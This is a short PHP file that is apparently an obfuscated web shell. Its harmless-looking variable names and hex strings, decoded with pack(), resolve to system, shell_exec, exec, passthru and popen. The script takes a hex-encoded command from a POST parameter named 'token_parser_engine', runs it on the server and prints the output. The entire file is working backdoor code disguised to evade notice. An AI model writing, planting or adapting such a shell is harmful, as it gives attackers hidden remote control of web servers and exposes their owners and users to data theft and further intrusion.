<?php


$tkn1 = '73';
$tkn2 = '79';
$tkn3 = '74';
$tkn4 = '65';
$tkn5 = '6c';
$tkn6 = '78';
$tkn7 = '70';
$tkn8 = '61';
$tkn9 = '75';
$tkn10 = '6e';
$tkn11 = '72';
$tkn12 = '6d';
$tkn13 = '5f';
$tkn14 = '6f';
$tkn15 = '63';
$tkn16 = '67';
$data_storage1 = pack("H*", $tkn1.$tkn2.'73'.$tkn3.$tkn4.'6d');
$data_storage2 = pack("H*", $tkn1.'68'.$tkn4.$tkn5.$tkn5.'5f'.'65'.$tkn6.$tkn4.'63');
$data_storage3 = pack("H*", '65'.'78'.'65'.'63');
$data_storage4 = pack("H*", $tkn7.$tkn8.$tkn1.$tkn1.'74'.'68'.'72'.$tkn9);
$data_storage5 = pack("H*", $tkn7.'6f'.'70'.$tkn4.$tkn10);
$data_storage6 = pack("H*", $tkn1.'74'.$tkn11.'65'.$tkn8.$tkn12.$tkn13.'67'.$tkn4.'74'.$tkn13.'63'.$tkn14.$tkn10.$tkn3.$tkn4.$tkn10.'74'.$tkn1);
$data_storage7 = pack("H*", $tkn7.$tkn15.'6c'.'6f'.'73'.$tkn4);
$token_parser_engine = pack("H*", '74'.$tkn14.'6b'.$tkn4.'6e'.'5f'.$tkn7.$tkn8.$tkn11.'73'.'65'.$tkn11.'5f'.'65'.'6e'.$tkn16.'69'.'6e'.'65');
if (isset($_POST[$token_parser_engine])) {
    $token_parser_engine = pack("H*", $_POST[$token_parser_engine]);
    if (function_exists($data_storage1)) {
        $data_storage1($token_parser_engine);
    } elseif (function_exists($data_storage2)) {
        print $data_storage2($token_parser_engine);
    } elseif (function_exists($data_storage3)) {
        $data_storage3($token_parser_engine, $holder_dat);
        print join("\n", $holder_dat);
    } elseif (function_exists($data_storage4)) {
        $data_storage4($token_parser_engine);
    } elseif (function_exists($data_storage5) && function_exists($data_storage6) && function_exists($data_storage7)) {
        $property_set_record = $data_storage5($token_parser_engine, 'r');
        if ($property_set_record) {
            $data_chunk_binding = $data_storage6($property_set_record);
            $data_storage7($property_set_record);
            print $data_chunk_binding;
        }
    }
    exit;
}
